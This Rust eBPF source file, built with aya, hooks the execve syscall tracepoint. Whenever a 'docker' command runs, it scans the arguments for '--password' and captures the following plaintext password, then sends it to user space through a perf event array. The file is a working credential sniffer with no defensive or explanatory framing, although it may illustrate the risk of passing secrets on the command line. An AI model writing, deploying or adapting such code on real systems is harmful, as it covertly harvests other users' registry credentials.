#![no_std]
#![no_main]

use aya_bpf::{
    helpers::{bpf_probe_read_user, bpf_probe_read_user_str},
    macros::{map, tracepoint},
    maps::PerfEventArray,
    programs::TracePointContext,
};
use docker_password_aya_common::DockerLog;

#[map(name = "EVENTS")]
static mut EVENTS: PerfEventArray<DockerLog> =
    PerfEventArray::<DockerLog>::with_max_entries(1024, 0);

#[tracepoint(name = "docker_password_aya")]
pub fn docker_password_aya(ctx: TracePointContext) -> u32 {
    match unsafe { try_docker_password_aya(&ctx) } {
        Ok(ret) => ret,
        Err(ret) => ret as u32,
    }
}

// $ sudo cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_execve/format
// name: sys_enter_execve
// ID: 711
// format:
//  field:unsigned short common_type;      offset:0;       size:2; signed:0;
//  field:unsigned char common_flags;      offset:2;       size:1; signed:0;
//  field:unsigned char common_preempt_count;      offset:3;  size:1;    signed:0;
//  field:int common_pid;  offset:4;       size:4; signed:1;

//  field:int __syscall_nr;        offset:8;       size:4; signed:1;
//  field:const char * filename;   offset:16;      size:8; signed:0;
//  field:const char *const * argv;        offset:24;      size:8; signed:0;
//  field:const char *const * envp;        offset:32;      size:8; signed:0;

// print fmt: "filename: 0x%08lx, argv: 0x%08lx, envp: 0x%08lx", ((unsigned long)(REC->filename)), ((unsigned long
// )(REC->argv)), ((unsigned long)(REC->envp))

unsafe fn try_docker_password_aya(ctx: &TracePointContext) -> Result<u32, i64> {
    let target = b"docker\0";
    let argv = ctx.read_at::<*const *const u8>(24)?;
    if argv.is_null() {
        return Err(0);
    }
    let mut exe = [0u8; 7];
    let exe_ptr = bpf_probe_read_user(argv)?;
    bpf_probe_read_user_str(exe_ptr, &mut exe)?;
    if &exe == target {
        #[derive(Eq, PartialEq)]
        enum ReadState {
            NotYet,
            ReadNext,
            Done,
        }
        let target = b"--password\0";
        let mut arg = [0u8; 32];
        let mut read_password = ReadState::NotYet;
        let mut count = 0;
        for i in 0..100 {
            arg = [0u8; 32];
            let arg_ptr = bpf_probe_read_user(argv.offset(i))?;
            if arg_ptr.is_null() {
                return Ok(0);
            }
            count = bpf_probe_read_user_str(arg_ptr, &mut arg)?;
            if read_password == ReadState::ReadNext {
                read_password = ReadState::Done;
                break;
            }
            if &arg[..count] == &target[..] {
                read_password = ReadState::ReadNext;
            }
        }
        if read_password == ReadState::Done {
            let entry = DockerLog { count, data: arg };
            EVENTS.output(ctx, &entry, 0);
        }
    }
    Ok(0)
}
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    unsafe { core::hint::unreachable_unchecked() }
}
